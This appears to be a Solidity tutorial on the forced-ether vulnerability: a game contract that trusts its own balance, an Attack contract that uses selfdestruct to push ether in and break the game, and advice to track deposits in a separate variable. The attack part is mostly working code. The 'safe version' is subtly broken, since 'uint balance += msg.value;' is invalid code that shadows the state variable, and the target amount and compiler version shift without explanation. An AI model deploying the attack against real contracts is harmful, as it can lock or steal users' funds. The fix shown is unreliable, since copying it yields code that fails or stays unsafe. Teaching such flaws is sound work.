
//EtherGame.sol
pragma solidity ^0.8.18;
contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

// Attack.sol

pragma solidity ^0.8.18;
import "./EtherGame.sol";
contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

Preventative Techniques

This vulnerability arises from the misuse of this.balance. Your contract should avoid being dependent on the exact values of the balance of the contract because it can be artificially manipulated.


If exact values of deposited ether are required, a self-defined variable should be used that gets 
incremented in payable functions, to safely track the deposited ether. 
This can prevent your contract to be influenced by the forced ether sent via a selfdestruct() call.


Let's see how the safe version of the contract looks like

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;



contract EtherGame {
    uint public targetAmount = 5 ether;
    address public winner;
    uint public balance;

    function play() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {

        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}


